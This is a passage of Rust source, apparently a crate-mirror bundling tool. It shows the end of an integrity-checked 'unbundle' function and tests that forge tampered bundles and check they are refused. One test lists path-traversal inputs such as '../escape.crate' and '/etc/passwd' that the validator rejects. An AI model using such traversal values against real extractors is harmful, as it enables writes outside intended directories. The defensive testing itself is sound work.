    let mut buffer = vec![0u8; IO_CHUNK_BYTES];
    // `landed` is the number of entries ALREADY on disk, which is what a
    // mid-run failure has to report.
    for (landed, entry) in manifest.files.iter().enumerate() {
        let destination = out.join(&entry.path);
        let parent = destination
            .parent()
            .ok_or_else(|| format!("output path has no parent: {}", destination.display()))?;
        std::fs::create_dir_all(parent).map_err(|e| {
            format!(
                "cannot create {}: {e}{}",
                parent.display(),
                partial(landed, out)
            )
        })?;
        // One stat per entry rather than a walk of the whole growing tree: the
        // pre-flight proved every ancestor, this narrows the window in which
        // one of them could have been swapped for a symlink since.
        match std::fs::symlink_metadata(parent) {
            Ok(meta) if meta.file_type().is_symlink() || !meta.is_dir() => {
                return Ok(unbundle_refused(
                    file,
                    out,
                    &format!(
                        "REFUSED output symlink {} — the tree changed under the run{}",
                        parent.display(),
                        partial(landed, out)
                    ),
                ));
            }
            Ok(_) => {}
            Err(e) => return Err(format!("cannot inspect {}: {e}", parent.display())),
        }
        let write = atomic_replace(&destination, |sink| {
            let mut digest = aterm_digest::Sha256::new();
            let mut left = entry.bytes;
            let mut copied = 0u64;
            while left > 0 {
                let want =
                    usize::try_from(left.min(IO_CHUNK_BYTES as u64)).unwrap_or(IO_CHUNK_BYTES);
                let read = reader
                    .read(&mut buffer[..want])
                    .map_err(|e| format!("cannot read {}: {e}", file.display()))?;
                if read == 0 {
                    return Err(format!(
                        "REFUSED truncated bundle while extracting `{}`",
                        entry.path
                    ));
                }
                digest.update(&buffer[..read]);
                sink.write_all(&buffer[..read])
                    .map_err(|e| format!("cannot write {}: {e}", destination.display()))?;
                copied = copied.saturating_add(read as u64);
                left -= read as u64;
            }
            Ok((digest_hex(digest.finalize()), copied))
        });
        // Every `REFUSED` on this path is a VERDICT — a truncated bundle, a
        // destination that changed type under the run — and only a genuine
        // I/O failure is a could-not-run.
        let (got, copied) =
            match write.map_err(|why| output_error(format!("{why}{}", partial(landed, out)))) {
                Ok(pair) => pair,
                Err(OutError::Refused(why)) => return Ok(unbundle_refused(file, out, &why)),
                Err(OutError::Unreadable(why)) => return Err(why),
            };
        if got != entry.sha256 || copied != entry.bytes {
            let _ = std::fs::remove_file(&destination);
            return Ok(unbundle_refused(
                file,
                out,
                &format!(
                    "REFUSED bundle entry `{}` on extraction: {copied} bytes hashing to {got}, \
                     manifest says {} bytes hashing to {} — the file changed between the \
                     verification pass and this one{}",
                    entry.path,
                    entry.bytes,
                    entry.sha256,
                    partial(landed, out)
                ),
            ));
        }
    }

    // WHAT IS ON DISK, not what the manifest claimed. Each write above was
    // individually correct and individually re-hashed, and that is exactly the
    // check that cannot see one entry landing on top of another: the clobber
    // happens BETWEEN writes. So every path is stat'd again here, and the
    // report is built from the result.
    let mut written_files = 0usize;
    let mut written_bytes = 0u64;
    for entry in &manifest.files {
        let destination = out.join(&entry.path);
        let meta = std::fs::symlink_metadata(&destination)
            .map_err(|e| format!("cannot inspect {}: {e}", destination.display()))?;
        if meta.file_type().is_symlink() || !meta.is_file() {
            return Ok(unbundle_refused(
                file,
                out,
                &format!(
                    "REFUSED {}: after extraction this is not the regular file it was written as",
                    destination.display()
                ),
            ));
        }
        if meta.len() != entry.bytes {
            return Ok(unbundle_refused(
                file,
                out,
                &format!(
                    "REFUSED `{}`: {} bytes on disk, {} written — another entry landed on top \
                     of it, so this extraction is not the bundle",
                    entry.path,
                    meta.len(),
                    entry.bytes
                ),
            ));
        }
        written_files += 1;
        written_bytes = written_bytes.saturating_add(meta.len());
    }
    // And the tree holds nothing else. Without `--force` the directory was
    // empty or absent a moment ago, so this is exact; with it, files that were
    // already there are counted and named rather than assumed harmless.
    let on_disk = match collect_files(out).map_err(output_error) {
        Ok(files) => files.len(),
        Err(OutError::Refused(why)) => return Ok(unbundle_refused(file, out, &why)),
        Err(OutError::Unreadable(why)) => return Err(why),
    };
    let strangers = on_disk.saturating_sub(written_files);
    if strangers > 0 && !force {
        return Ok(unbundle_refused(
            file,
            out,
            &format!(
                "REFUSED {}: {on_disk} file(s) on disk after writing {written_files} — the \
                 directory was empty when this run started",
                out.display()
            ),
        ));
    }

    let mut log = String::new();
    let _ = writeln!(
        log,
        "mirror unbundle — {} -> {}",
        file.display(),
        out.display()
    );
    let _ = writeln!(
        log,
        "  verified before unpacking, then re-hashed on write: {} package(s)",
        manifest.packages.len()
    );
    let _ = writeln!(
        log,
        "  on disk after the run: {written_files} file(s), {written_bytes} bytes — stat'd, not \
         copied from the manifest"
    );
    // THE SAME PARAGRAPH `check-bundle` PRINTS. Without it a run that anchored
    // 494 of 494 rows and a run that anchored 0 of 494 — and wrote an edited
    // `features` map to disk — differed by nothing an operator could read.
    tally.report(&mut log, lock);
    if strangers > 0 {
        let _ = writeln!(
            log,
            "  --force: {strangers} file(s) already under {} were left in place and are NOT \
             part of this bundle; `mirror verify` judges them.",
            out.display()
        );
    }
    let _ = writeln!(
        log,
        "  next: `cargo forge mirror verify --dir {}` re-derives the lock/index/tarball triple \
         from disk.",
        out.display()
    );
    let _ = writeln!(log, "  PASS");
    Ok(Outcome { ok: true, log })
}

/// The sentence appended to every mid-extraction failure. `check_bundle` and
/// `prepare_output` between them make a half-written tree unreachable for a
/// bundle that is merely hostile; what remains is the filesystem failing under
/// the run (a full disk, an I/O error, a tree edited from another process),
/// and when that happens the operator is told how much landed instead of
/// finding out later.
fn partial(landed: usize, out: &Path) -> String {
    if landed == 0 {
        format!(" — nothing was extracted into {}", out.display())
    } else {
        format!(
            " — PARTIAL EXTRACTION: {landed} file(s) had already been written into {}; delete \
             that directory before re-running",
            out.display()
        )
    }
}

// ---------------------------------------------------------------------------
// tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::mirror::index_rel_path;

    struct Fixture(PathBuf);

    impl Drop for Fixture {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    impl Fixture {
        fn root(&self) -> PathBuf {
            self.0.join("ws")
        }
        fn mirror(&self) -> PathBuf {
            self.0.join("mirror")
        }
        fn bundle_path(&self) -> PathBuf {
            self.0.join("out.bundle")
        }
        fn extracted(&self) -> PathBuf {
            self.0.join("extracted")
        }
        fn cargo_home(&self) -> PathBuf {
            self.0.join("cargo-home")
        }
    }

    const PKGS: &[(&str, &str, &[u8])] = &[
        ("alpha-bundle-test", "1.2.3", b"alpha crate bytes"),
        ("abc", "0.1.0", b"three-char name bytes"),
    ];

    /// These cases are about the FORMAT, not about provenance, so they say
    /// plainly that no upstream anchor was consulted; the provenance cases
    /// below build a real one from the fixture's cargo home.
    fn unanchored() -> mirror::RowAnchor {
        mirror::RowAnchor::absent("test fixture: no upstream anchor consulted")
    }

    fn index_line(name: &str, vers: &str, cksum: &str) -> String {
        format!(
            "{{\"name\":\"{name}\",\"vers\":\"{vers}\",\"deps\":[],\"cksum\":\"{cksum}\",\
             \"features\":{{}},\"yanked\":false}}"
        )
    }

    /// A workspace lock plus an already-emitted, already-consistent mirror —
    /// the state `bundle` is allowed to run on.
    fn fixture(tag: &str) -> Fixture {
        let dir =
            std::env::temp_dir().join(format!("aterm-forge-bundle-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let fx = Fixture(dir);
        std::fs::create_dir_all(fx.root()).unwrap();
        std::fs::create_dir_all(fx.mirror()).unwrap();
        let mut lock = String::from(
            "version = 4\n\n[[package]]\nname = \"aterm-thing\"\nversion = \"0.1.0\"\n",
        );
        for (name, vers, bytes) in PKGS {
            let ck = sha256_hex(bytes);
            let _ = write!(
                lock,
                "\n[[package]]\nname = \"{name}\"\nversion = \"{vers}\"\n\
                 source = \"registry+https://github.com/rust-lang/crates.io-index\"\n\
                 checksum = \"{ck}\"\n"
            );
            std::fs::write(fx.mirror().join(format!("{name}-{vers}.crate")), bytes).unwrap();
            let ipath = fx
                .mirror()
                .join("index")
                .join(index_rel_path(name).unwrap());
            std::fs::create_dir_all(ipath.parent().unwrap()).unwrap();
            std::fs::write(ipath, format!("{}\n", index_line(name, vers, &ck))).unwrap();
        }
        std::fs::write(fx.root().join("Cargo.lock"), lock).unwrap();
        fx
    }

    fn good_bundle(fx: &Fixture) -> Vec<u8> {
        let (outcome, _) =
            bundle(&fx.root(), &fx.mirror(), &fx.bundle_path(), &unanchored()).unwrap();
        assert!(
            outcome.ok,
            "fixture bundle should be green:\n{}",
            outcome.log
        );
        std::fs::read(fx.bundle_path()).unwrap()
    }

    /// Split a bundle into (header, manifest text, payload) so a test can
    /// rewrite one piece and re-seal the rest.
    fn split(raw: &[u8]) -> (String, String, Vec<u8>) {
        let text = String::from_utf8(raw.to_vec()).expect("fixture bundles are UTF-8");
        let (header, rest) = text.split_once("\n\n").unwrap();
        let bytes: u64 = header
            .lines()
            .find_map(|l| l.strip_prefix("manifest-bytes "))
            .unwrap()
            .parse()
            .unwrap();
        let manifest = rest[..bytes as usize].to_string();
        let payload = rest.as_bytes()[bytes as usize..].to_vec();
        (header.to_string(), manifest, payload)
    }

    /// Re-seal a (possibly edited) manifest with a correct header, so the test
    /// exercises the rule it means to and not a stale digest.
    fn seal(manifest: &str, payload: &[u8]) -> Vec<u8> {
        let mut out = Vec::new();
        out.extend_from_slice(format!("{MAGIC}\n").as_bytes());
        out.extend_from_slice(
            format!("manifest-sha256 {}\n", sha256_hex(manifest.as_bytes())).as_bytes(),
        );
        out.extend_from_slice(format!("manifest-bytes {}\n\n", manifest.len()).as_bytes());
        out.extend_from_slice(manifest.as_bytes());
        out.extend_from_slice(payload);
        out
    }

    /// Rewrite one header field of a manifest, matching the WHOLE line — the
    /// naive `replace("packages 2", …)` also hits `lock-registry-packages 2`,
    /// which made three of these tests trip an earlier refusal than the one
    /// they were arming.
    fn set_field(manifest: &str, key: &str, value: &str) -> String {
        let mut out = String::new();
        let mut hits = 0usize;
        for line in manifest.lines() {
            if line.starts_with(&format!("{key} ")) {
                hits += 1;
                let _ = writeln!(out, "{key} {value}");
            } else {
                let _ = writeln!(out, "{line}");
            }
        }
        assert_eq!(hits, 1, "`{key}` should appear exactly once");
        out
    }

    /// Drop a `file` row and keep the counts honest, so the rule under test is
    /// the one that fires.
    fn drop_file_row(manifest: &str, path: &str) -> String {
        let kept: String = manifest
            .lines()
            .filter(|l| !(l.starts_with("file ") && l.ends_with(&format!(" {path}"))))
            .fold(String::new(), |mut acc, l| {
                let _ = writeln!(acc, "{l}");
                acc
            });
        assert_ne!(
            kept.lines().count(),
            manifest.lines().count(),
            "no such row"
        );
        let count = kept.lines().filter(|l| l.starts_with("file ")).count();
        let total: u64 = kept
            .lines()
            .filter_map(|l| l.strip_prefix("file "))
            .filter_map(|r| r.split(' ').nth(1))
            .map(|n| n.parse::<u64>().unwrap())
            .sum();
        let kept = set_field(&kept, "files", &count.to_string());
        set_field(&kept, "payload-bytes", &total.to_string())
    }

    /// Splice extra entries into a manifest AND its payload, keeping both in
    /// the canonical order the reader demands and the counts honest — the
    /// shape a real forged delivery takes, not a malformed one. Everything
    /// weaker than the rule under test is therefore already satisfied when the
    /// refusal fires.
    fn add_entries(manifest: &str, payload: &[u8], extra: &[(&str, &[u8])]) -> (String, Vec<u8>) {
        let mut pieces: Vec<(String, Vec<u8>)> = Vec::new();
        let mut at = 0usize;
        for line in manifest.lines().filter(|l| l.starts_with("file ")) {
            let mut parts = line.strip_prefix("file ").unwrap().splitn(3, ' ');
            let _sha = parts.next().unwrap();
            let size: usize = parts.next().unwrap().parse().unwrap();
            let path = parts.next().unwrap();
            pieces.push((path.to_string(), payload[at..at + size].to_vec()));
            at += size;
        }
        for (path, bytes) in extra {
            pieces.push(((*path).to_string(), bytes.to_vec()));
        }
        pieces.sort_by(|a, b| a.0.cmp(&b.0));

        let mut rows = String::new();
        let mut new_payload = Vec::new();
        for (path, bytes) in &pieces {
            let _ = writeln!(rows, "file {} {} {path}", sha256_hex(bytes), bytes.len());
            new_payload.extend_from_slice(bytes);
        }
        let mut out = String::new();
        for line in manifest.lines() {
            if line.starts_with("file ") {
                continue;
            }
            let _ = writeln!(out, "{line}");
            if line.starts_with("packages ") {
                out.push_str(&rows);
            }
        }
        let out = set_field(&out, "files", &pieces.len().to_string());
        let out = set_field(&out, "payload-bytes", &new_payload.len().to_string());
        (out, new_payload)
    }

    /// Re-derive `lock-registry-sha256` from a manifest's own `pkg` rows, so a
    /// helper that edits the ledger leaves the rule under test as the one that
    /// fires rather than tripping the ledger-digest rule on the way in.
    fn reanchor(manifest: &str) -> String {
        let rows: Vec<(String, String, String)> = manifest
            .lines()
            .filter_map(|l| l.strip_prefix("pkg "))
            .map(|rest| {
                let mut parts = rest.splitn(3, ' ');
                (
                    parts.next().unwrap().to_string(),
                    parts.next().unwrap().to_string(),
                    parts.next().unwrap().to_string(),
                )
            })
            .collect();
        let slice = canonical_slice_rows(
            rows.iter()
                .map(|(n, v, c)| (n.as_str(), v.as_str(), c.as_str())),
        );
        let manifest = set_field(
            manifest,
            "lock-registry-sha256",
            &sha256_hex(slice.as_bytes()),
        );
        set_field(&manifest, "lock-registry-packages", &rows.len().to_string())
    }

    /// Add `pkg` rows in canonical order and keep both package counts honest.
    fn add_pkg_rows(manifest: &str, extra: &[(&str, &str, String)]) -> String {
        let mut rows: Vec<(String, String, String)> = manifest
            .lines()
            .filter_map(|l| l.strip_prefix("pkg "))
            .map(|rest| {
                let mut parts = rest.splitn(3, ' ');
                (
                    parts.next().unwrap().to_string(),
                    parts.next().unwrap().to_string(),
                    parts.next().unwrap().to_string(),
                )
            })
            .collect();
        for (name, version, cksum) in extra {
            rows.push(((*name).to_string(), (*version).to_string(), cksum.clone()));
        }
        rows.sort();
        let mut out = String::new();
        for line in manifest.lines() {
            if line.starts_with("pkg ") {
                continue;
            }
            let _ = writeln!(out, "{line}");
        }
        for (name, version, cksum) in &rows {
            let _ = writeln!(out, "pkg {name} {version} {cksum}");
        }
        let out = set_field(&out, "packages", &rows.len().to_string());
        reanchor(&out)
    }

    /// Plant cargo's own sparse-index cache for this fixture's packages, so
    /// [`mirror::RowAnchor`] has upstream's rows to compare against. The bytes
    /// are the same rows the fixture mirror carries, in cargo's v3 cache
    /// framing (`3`, a u32 index-format version, then NUL-separated
    /// `revision, (version, json)*`).
    fn plant_cache(fx: &Fixture) {
        let index = fx.cargo_home().join("registry/index/index.test-0000");
        std::fs::create_dir_all(&index).unwrap();
        std::fs::write(
            index.join("config.json"),
            r#"{"dl":"https://static.crates.io/crates","api":"https://crates.io"}"#,
        )
        .unwrap();
        for (name, vers, bytes) in PKGS {
            let mut data = vec![3u8, 2, 0, 0, 0];
            data.extend_from_slice(b"etag: \"test\"");
            data.push(0);
            data.extend_from_slice(vers.as_bytes());
            data.push(0);
            data.extend_from_slice(index_line(name, vers, &sha256_hex(bytes)).as_bytes());
            data.push(0);
            let path = index.join(".cache").join(index_rel_path(name).unwrap());
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, data).unwrap();
        }
    }

    /// Rewrite ONE entry's bytes and re-seal every digest the manifest carries
    /// for it — the shape a re-sealing attacker's bundle takes, in which
    /// nothing inside the file disagrees with anything else inside the file.
    fn replace_entry(
        manifest: &str,
        payload: &[u8],
        path: &str,
        bytes: &[u8],
    ) -> (String, Vec<u8>) {
        let mut out = String::new();
        let mut spliced = Vec::new();
        let mut at = 0usize;
        let mut hit = false;
        for line in manifest.lines() {
            let Some(rest) = line.strip_prefix("file ") else {
                let _ = writeln!(out, "{line}");
                continue;
            };
            let mut parts = rest.splitn(3, ' ');
            let _sha = parts.next().unwrap();
            let size: usize = parts.next().unwrap().parse().unwrap();
            let this = parts.next().unwrap();
            let chunk: &[u8] = if this == path {
                hit = true;
                bytes
            } else {
                &payload[at..at + size]
            };
            at += size;
            let _ = writeln!(out, "file {} {} {this}", sha256_hex(chunk), chunk.len());
            spliced.extend_from_slice(chunk);
        }
        assert!(hit, "no such entry `{path}`");
        let out = set_field(&out, "payload-bytes", &spliced.len().to_string());
        let out = set_field(&out, "payload-sha256", &sha256_hex(&spliced));
        (out, spliced)
    }

    /// Drop a package — its `pkg` row, both of its entries and their payload
    /// bytes — WITHOUT touching `lock-registry-sha256`. The N2 shape: a bundle
    /// carrying a SUBSET of a lock while quoting the whole lock's digest.
    fn drop_package(manifest: &str, payload: &[u8], name: &str, vers: &str) -> (String, Vec<u8>) {
        let doomed = [
            format!("{name}-{vers}.crate"),
            format!("index/{}", mirror::index_rel_slashed(name).unwrap()),
        ];
        let mut out = String::new();
        let mut spliced = Vec::new();
        let mut at = 0usize;
        let mut files = 0usize;
        let mut packages = 0usize;
        for line in manifest.lines() {
            if let Some(rest) = line.strip_prefix("file ") {
                let mut parts = rest.splitn(3, ' ');
                let _sha = parts.next().unwrap();
                let size: usize = parts.next().unwrap().parse().unwrap();
                let path = parts.next().unwrap();
                let chunk = &payload[at..at + size];
                at += size;
                if doomed.iter().any(|d| d == path) {
                    continue;
                }
                files += 1;
                spliced.extend_from_slice(chunk);
                let _ = writeln!(out, "{line}");
            } else if let Some(rest) = line.strip_prefix("pkg ") {
                if rest.starts_with(&format!("{name} {vers} ")) {
                    continue;
                }
                packages += 1;
                let _ = writeln!(out, "{line}");
            } else {
                let _ = writeln!(out, "{line}");
            }
        }
        let out = set_field(&out, "files", &files.to_string());
        let out = set_field(&out, "packages", &packages.to_string());
        let out = set_field(&out, "lock-registry-packages", &packages.to_string());
        let out = set_field(&out, "payload-bytes", &spliced.len().to_string());
        let out = set_field(&out, "payload-sha256", &sha256_hex(&spliced));
        (out, spliced)
    }

    fn write_bundle(fx: &Fixture, raw: &[u8]) -> PathBuf {
        let path = fx.0.join("edited.bundle");
        std::fs::write(&path, raw).unwrap();
        path
    }

    /// The refusal a test asserts on: either a hard `Err` or a RED outcome.
    /// Both are failures; a test that accepted only one shape would let a
    /// refusal silently change class.
    fn refusal(result: Result<(Outcome, Manifest, RowTally), String>) -> String {
        match result {
            Err(why) => why,
            Ok((outcome, _, _)) => {
                assert!(
                    !outcome.ok,
                    "expected a refusal, got PASS:\n{}",
                    outcome.log
                );
                outcome.log
            }
        }
    }

    // --- the happy path, and the determinism claim ------------------------

    #[test]
    fn bundle_round_trips_and_a_second_run_is_byte_identical() {
        let fx = fixture("roundtrip");
        let first = good_bundle(&fx);
        let second_path = fx.0.join("second.bundle");
        let (outcome, st) = bundle(&fx.root(), &fx.mirror(), &second_path, &unanchored()).unwrap();
        assert!(outcome.ok, "{}", outcome.log);
        let second = std::fs::read(&second_path).unwrap();
        assert_eq!(first, second, "two bundles of one mirror must be identical");
        assert_eq!(st.packages, PKGS.len());
        assert_eq!(
            st.files,
            PKGS.len() * 2,
            "one .crate and one index row each"
        );
        assert_eq!(st.bundle_sha256, sha256_hex(&second));

        let outcome = unbundle(
            &fx.bundle_path(),
            &fx.extracted(),
            false,
            LockUse::None,
            &unanchored(),
        )
        .unwrap();
        assert!(outcome.ok, "{}", outcome.log);
        for (name, vers, bytes) in PKGS {
            let extracted = fx.extracted().join(format!("{name}-{vers}.crate"));
            assert_eq!(std::fs::read(&extracted).unwrap(), *bytes);
            let row = fx
                .extracted()
                .join("index")
                .join(index_rel_path(name).unwrap());
            assert!(row.is_file(), "{} should exist", row.display());
        }
        // And the extracted tree is a mirror again, judged by the mirror's own
        // verifier rather than by this module's opinion of itself.
        let verdict = crate::mirror::verify(&fx.root(), &fx.extracted(), &unanchored()).unwrap();
        assert!(verdict.ok, "{}", verdict.log);
        // Re-bundling the extracted tree reproduces the original bundle: the
        // round trip is closed, not merely plausible.
        let third = fx.0.join("third.bundle");
        bundle(&fx.root(), &fx.extracted(), &third, &unanchored()).unwrap();
        assert_eq!(std::fs::read(&third).unwrap(), first);
    }

    #[test]
    fn check_bundle_writes_nothing_and_proves_the_whole_chain() {
        let fx = fixture("check");
        good_bundle(&fx);
        let before = collect_files(&fx.0).unwrap();
        let (outcome, manifest, _) =
            check_bundle(LockUse::Match(&fx.root()), &fx.bundle_path(), &unanchored()).unwrap();
        assert!(outcome.ok, "{}", outcome.log);
        assert!(outcome.log.contains("Nothing was written"));
        assert_eq!(manifest.packages.len(), PKGS.len());
        let after = collect_files(&fx.0).unwrap();
        assert_eq!(before, after, "check-bundle must create and remove nothing");
    }

    // --- refusals ---------------------------------------------------------

    #[test]
    fn a_flipped_payload_byte_is_named_and_nothing_is_extracted() {
        let fx = fixture("payload-flip");
        let mut raw = good_bundle(&fx);
        let last = raw.len() - 1;
        raw[last] ^= 0x01;
        let path = write_bundle(&fx, &raw);
        let log = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(
            log.contains("payload bytes hash to"),
            "the entry digest must be named: {log}"
        );
        let outcome =
            unbundle(&path, &fx.extracted(), false, LockUse::None, &unanchored()).unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert!(
            !fx.extracted().exists(),
            "a refused bundle must not create an output directory"
        );
    }

    #[test]
    fn a_flipped_manifest_byte_is_refused_before_any_payload_is_read() {
        let fx = fixture("manifest-flip");
        let raw = good_bundle(&fx);
        let (header, manifest, payload) = split(&raw);
        // Edit the manifest but keep the ORIGINAL header digest: exactly the
        // shape a tamper takes when the attacker forgets to re-seal.
        let mut forged = Vec::new();
        forged.extend_from_slice(header.as_bytes());
        forged.extend_from_slice(b"\n\n");
        let mut body = manifest.into_bytes();
        body[0] ^= 0x20; // 'f' of `format` -> 'F'
        forged.extend_from_slice(&body);
        forged.extend_from_slice(&payload);
        let path = write_bundle(&fx, &forged);
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(
            why.contains("manifest digest") && why.contains("corrupt or altered"),
            "{why}"
        );
    }

    #[test]
    fn a_re_sealed_manifest_still_has_to_agree_with_the_payload() {
        // The digest chain is not a formality: re-sealing the header only moves
        // the refusal one link down.
        let fx = fixture("resealed");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);
        let (name, vers, _) = PKGS[0];
        let entry = format!("{name}-{vers}.crate");
        let row = manifest
            .lines()
            .find(|l| l.starts_with("file ") && l.ends_with(&entry))
            .unwrap()
            .to_string();
        let digest = row.split(' ').nth(1).unwrap();
        let lie = format!("{}0", &digest[..63]);
        let lie = if lie == digest {
            format!("{}1", &digest[..63])
        } else {
            lie
        };
        // The `file` row ONLY: that digest also appears as the `pkg` row's
        // cksum, and rewriting both would move the refusal to the ledger's own
        // digest rule instead of the link this case is about.
        let edited = manifest.replace(&row, &row.replace(digest, &lie));
        let path = write_bundle(&fx, &seal(&edited, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(
            why.contains("payload bytes hash to") || why.contains("disagrees with the lock cksum"),
            "{why}"
        );
    }

    #[test]
    fn traversal_absolute_and_backslash_paths_are_refused() {
        for path in [
            "../escape.crate",
            "index/../../escape",
            "/etc/passwd",
            "..",
            ".",
            "index/./row",
            "a//b",
            "dir/",
            "back\\slash",
            "c:\\windows\\system32",
            "",
        ] {
            let why = validate_entry_path(path).unwrap_err();
            assert!(why.starts_with("REFUSED"), "`{path}` -> {why}");
        }
        assert!(validate_entry_path("index/3/a/abc").is_ok());
        assert!(validate_entry_path("abc-0.1.0.crate").is_ok());
    }

    #[test]
    fn a_traversal_row_inside_a_sealed_manifest_is_refused_before_extraction() {
        let fx = fixture("traversal-row");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);
        // A perfectly-sealed bundle whose only sin is where it wants to write.
        let edited = manifest.replacen(
            &format!("{}-{}.crate", PKGS[0].0, PKGS[0].1),
            "../../escaped.crate",
            1,
        );
        let path = write_bundle(&fx, &seal(&edited, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("REFUSED"), "{why}");
        let outcome = unbundle(&path, &fx.extracted(), false, LockUse::None, &unanchored());
        let log = match outcome {
            Ok(o) => o.log,
            Err(e) => e,
        };
        assert!(log.contains("REFUSED"), "{log}");
        assert!(!fx.0.join("escaped.crate").exists());
        assert!(!fx.0.parent().unwrap().join("escaped.crate").exists());
    }

    #[test]
    fn duplicate_and_out_of_order_rows_are_refused() {
        let fx = fixture("dupes");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);

        let first_file = manifest.lines().find(|l| l.starts_with("file ")).unwrap();
        let duplicated = manifest.replacen(first_file, &format!("{first_file}\n{first_file}"), 1);
        let duplicated = set_field(&duplicated, "files", "5");
        let path = write_bundle(&fx, &seal(&duplicated, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("duplicate bundle entry"), "{why}");

        let mut rows: Vec<&str> = manifest
            .lines()
            .filter(|l| l.starts_with("file "))
            .collect();
        rows.reverse();
        let mut reordered = String::new();
        for line in manifest.lines() {
            if line.starts_with("file ") {
                continue;
            }
            let _ = writeln!(reordered, "{line}");
            if line.starts_with("packages ") {
                for row in &rows {
                    let _ = writeln!(reordered, "{row}");
                }
            }
        }
        let path = write_bundle(&fx, &seal(&reordered, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("out of canonical order"), "{why}");

        let first_pkg = manifest.lines().find(|l| l.starts_with("pkg ")).unwrap();
        let doubled = manifest.replacen(first_pkg, &format!("{first_pkg}\n{first_pkg}"), 1);
        let doubled = set_field(&doubled, "packages", "3");
        let doubled = set_field(&doubled, "lock-registry-packages", "3");
        let path = write_bundle(&fx, &seal(&doubled, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("duplicate bundle package row"), "{why}");
    }

    #[test]
    fn trailing_bytes_and_truncation_are_both_refused() {
        let fx = fixture("length");
        let raw = good_bundle(&fx);

        let mut longer = raw.clone();
        longer.extend_from_slice(b"stowaway");
        let path = write_bundle(&fx, &longer);
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("trailing bytes"), "{why}");

        let path = write_bundle(&fx, &raw[..raw.len() - 4]);
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("ends") && why.contains("early"), "{why}");
    }

    #[test]
    fn a_package_row_and_its_crate_entry_must_agree() {
        let fx = fixture("pkg-binding");
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);

        // A pkg row whose cksum is not the digest of the file it names.
        let pkg = manifest.lines().find(|l| l.starts_with("pkg ")).unwrap();
        let cksum = pkg.rsplit(' ').next().unwrap();
        let lie = format!("{}0", &cksum[..63]);
        let lie = if lie == cksum {
            format!("{}1", &cksum[..63])
        } else {
            lie
        };
        // Re-anchored, so the ledger's own digest rule — an easier one, checked
        // first — is satisfied and the refusal that fires is the BINDING.
        let edited = reanchor(&manifest.replacen(pkg, &pkg.replace(cksum, &lie), 1));
        let path = write_bundle(&fx, &seal(&edited, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("disagrees with the lock cksum"), "{why}");

        // A pkg row with no file at all.
        let dropped = drop_file_row(&manifest, &format!("{}-{}.crate", PKGS[0].0, PKGS[0].1));
        // Every structural count is corrected first, so the refusal that fires
        // is the PACKAGE BINDING and not an easier arithmetic one — the totals
        // are checked ahead of it inside `parse_manifest`.
        let path = write_bundle(&fx, &seal(&dropped, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("no `") && why.contains("entry"), "{why}");
    }

    #[test]
    fn a_crate_entry_no_package_row_claims_is_refused() {
        let fx = fixture("stray");
        // A tarball smuggled into the mirror is caught by `mirror::verify`
        // first — bundling a drifted mirror is refused outright.
        std::fs::write(fx.mirror().join("stowaway-9.9.9.crate"), b"not in the lock").unwrap();
        let (outcome, _) =
            bundle(&fx.root(), &fx.mirror(), &fx.bundle_path(), &unanchored()).unwrap();
        assert!(!outcome.ok, "{}", outcome.log);
        assert!(outcome.log.contains("does not verify"), "{}", outcome.log);
        assert!(
            outcome.log.contains("stray .crate"),
            "the verify report must be quoted, not summarised: {}",
            outcome.log
        );
        assert!(
            !fx.bundle_path().exists(),
            "a refused bundle run must leave no file"
        );

        // And the manifest rule holds independently, for a bundle that never
        // came from this tool.
        std::fs::remove_file(fx.mirror().join("stowaway-9.9.9.crate")).unwrap();
        let raw = good_bundle(&fx);
        let (_, manifest, payload) = split(&raw);
        let dropped: String = manifest.lines().filter(|l| !l.starts_with("pkg ")).fold(
            String::new(),
            |mut acc, l| {
                let _ = writeln!(acc, "{l}");
                acc
            },
        );
        let dropped = set_field(&dropped, "packages", "0");
        let dropped = reanchor(&dropped);
        let path = write_bundle(&fx, &seal(&dropped, &payload));
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("not a mirror path"), "{why}");
    }

    #[test]
    fn a_symlink_inside_the_mirror_is_refused_at_bundle_time() {
        let fx = fixture("symlink");
        let target = fx
            .mirror()
            .join(format!("{}-{}.crate", PKGS[0].0, PKGS[0].1));
        let link = fx.mirror().join("index").join("link");
        #[cfg(unix)]
        std::os::unix::fs::symlink(&target, &link).unwrap();
        #[cfg(not(unix))]
        let _ = (&target, &link);
        #[cfg(unix)]
        {
            let why = match bundle(&fx.root(), &fx.mirror(), &fx.bundle_path(), &unanchored()) {
                Err(why) => why,
                Ok((outcome, _)) => {
                    assert!(!outcome.ok, "{}", outcome.log);
                    outcome.log
                }
            };
            assert!(why.contains("symlink"), "{why}");
            assert!(!fx.bundle_path().exists());
        }
    }

    #[test]
    fn a_foreign_file_is_not_mistaken_for_a_bundle() {
        let fx = fixture("foreign");
        let path = fx.0.join("random.bin");
        std::fs::write(&path, b"GIF89a\x00\x00not a bundle at all\n").unwrap();
        let why = refusal(check_bundle(LockUse::None, &path, &unanchored()));
        assert!(why.contains("is not an aterm mirror bundle"), "{why}");

